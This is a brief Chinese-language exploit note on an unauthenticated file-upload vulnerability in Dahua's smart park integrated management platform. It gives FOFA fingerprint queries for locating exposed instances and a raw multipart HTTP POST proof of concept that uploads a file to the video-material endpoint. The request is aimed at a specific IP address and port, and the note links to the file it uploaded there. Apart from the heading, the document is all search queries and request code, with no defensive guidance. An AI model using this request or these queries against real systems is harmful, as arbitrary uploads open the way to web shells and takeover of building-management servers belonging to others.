# 大华智慧园区综合管理平台 sourcepublishingpublishingmaterialfilevideo 文件上传漏洞

    ## fofa

```
body="src=\"/WPMS/asset/common/js/jsencrypt.min.js\""

product="dahua-智慧园区综合管理平台"
```

## poc

http://110.188.114.27:30000/publishingImg/VIDEO/230809113241124030.txt

```
POST /publishing/publishing/material/file/video HTTP/1.1
Host: 110.188.114.27:30000
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: multipart/form-data; boundary=dd8f988919484abab3816881c55272a7
Accept-Encoding: gzip
Content-Length: 151

--dd8f988919484abab3816881c55272a7
Content-Disposition: form-data; name="Filedata"; filename="test.txt"

test
--dd8f988919484abab3816881c55272a7--
```
